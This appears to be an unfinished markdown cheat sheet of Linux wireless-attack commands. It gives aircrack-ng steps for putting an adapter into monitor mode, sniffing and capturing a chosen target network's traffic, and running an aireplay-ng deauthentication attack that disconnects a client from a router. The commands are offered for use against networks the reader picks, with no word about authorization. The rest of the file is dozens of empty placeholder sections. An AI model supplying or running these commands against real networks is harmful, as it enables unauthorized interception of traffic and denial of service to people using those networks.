# These commands are works only on linux based system
## An external Network Adapter is required, Your Network Adapter must support `monitor mode`, `packet injection mode`.
### Here my network interface name is `wlan1`, Your interface Name may be diffrent use accordingly.
&nbsp;
### see wireless networks
```
iwconfig
```
### see wireless network iP 
```
ifconfig
```
### disable network interface 
```
ifconfig wlan1 down
```
### kill network manager
```
airmon-ng check kill
```
### change interface `managed` mode to `monitor` mode
```
iwconfig wlan1 mode monitor
```
### Enable Network Interface
```
ifconfig wlan1 up
```

---
&nbsp;
# Packet Sniffing

### sniff network around us `2.4 GHz frequency only`
```
airodump-ng wlan1
```
### sniff network Both `2.4 GHz and 5 GHz`
```
airodump-ng --band a wlan1
```
### capture data both `2.4 GHz and 5 GHz`
```
airodump-ng --band abg wlan1
```
### caputre data into a file `fileName`
```
airodump-ng --bssid @1 --channel @2 --write fileName wlan1
```

@1 → `BSSID` of target

@2 → Channel no. of target

### open wireshark application to read captured data, captured in `fileName.cap`, 
```
wireshark
```


---
&nbsp;
# DE-Authentication Attack
```
aireplay-ng --deauth @1 -a @2 -c @3 wlan1
```
@1 → no. of packets you want to send 

@2 → BSSID of router

@3 → MAC Address of the Client

### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
### 
```

```
